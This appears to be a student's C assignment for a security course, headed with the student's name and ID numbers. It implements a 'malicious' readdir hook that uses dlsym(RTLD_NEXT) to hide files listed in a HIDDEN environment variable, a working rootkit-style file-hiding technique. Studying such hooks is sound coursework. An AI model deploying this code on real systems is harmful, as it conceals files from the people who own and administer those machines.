/*
 * Name: Christopher Naporlee
 * netID: cmn134
 * RUID: 187008361
 */

#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Extra credit */
static int should_hide(const char *fname)
{
	const char *hiders;
	char *hiders_dup, *env_var, *to_free;
	int hide = 0;

	hiders = getenv("HIDDEN");
	if (!hiders) /* Nothing to hide */
		return hide;

	hiders_dup = strdup(hiders);
	if (!hiders_dup)
		err(1, "strdup() error");
	to_free = hiders_dup;

	/*
	 * Parse the ':' seperated file names, for this project we are safe
	 * to assume that no file holds a ':' in its name.
	 */
	while ((env_var = strsep(&hiders_dup, ":")) != NULL) {
		if (*env_var && !strcmp(env_var, fname)) {
			hide = 1;
			break;
		}
	}
	free(to_free);
	return hide;
}

/* Malicious readdir */
struct dirent *readdir(DIR *dirp)
{
	struct dirent *(*old_readdir)(DIR *dirp), *ret;

	old_readdir = dlsym(RTLD_NEXT, "readdir");
	if (!old_readdir)
		err(1, "dlsym() fail. Couldn't get original readdir");
	do {
		ret = old_readdir(dirp);
	} while (ret && should_hide(ret->d_name));
	return ret;
}
